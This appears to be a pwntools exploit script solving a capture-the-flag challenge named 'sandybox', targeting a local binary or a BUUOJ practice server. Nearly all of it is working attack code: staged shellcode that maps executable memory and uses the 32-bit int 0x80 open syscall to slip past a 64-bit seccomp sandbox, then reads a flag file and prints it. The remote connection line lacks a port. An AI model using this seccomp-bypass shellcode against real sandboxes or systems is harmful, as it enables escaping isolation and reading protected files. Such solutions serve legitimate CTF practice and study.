from pwn import *
from struct import pack
from sys import argv
from os import system

#context.log_level="debug"
context.arch = 'amd64'

if sys.argv[1]=="debug":
    sh = process("./sandybox")
elif sys.argv[1]=="remote":
    sh = remote("node3.buuoj.cn",)

elf = ELF("./sandybox")

ru = lambda x:sh.recvuntil(x)
rv = lambda x:sh.recv(x)
ra = lambda x:sh.recvall(x)
sl = lambda x:sh.sendline(x)
sd = lambda x:sh.send(x) 
sla = lambda x,y:sh.sendlineafter(x,y)
lg = lambda x:log.success(x)

def dbg():
    gdb.attach(sh)



shellcode = asm('''
mov edx,0x1000
sub eax,0x1
syscall
''', arch='amd64')

shellcode += asm('''
mov    rax,0x9
xor    rdi,rdi
mov    rsi,0x1000
mov    rdx,0x7
mov    r10,0x32
xor    r8,r8
xor    r9,r9
syscall

mov    r12d,eax
mov    rdx,0x67616c66
mov    QWORD PTR [rax],rdx

mov    rbx,rax
xor    rcx,rcx
mov    rax,0x5
int    0x80

xor    rdi,rdi
xchg   rdi,rax
mov    rsi,r12 
mov    rdx,0x100
xor    rax,rax
syscall

mov    rsi,r12
mov    rdx,0x10
mov    rdi,0x1
mov    rax,0x1
syscall

mov    rax,0x3c
syscall
''', arch='amd64')

ru("> ")
sd(shellcode)

ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
flag = rv(16)
lg("{}".format(flag))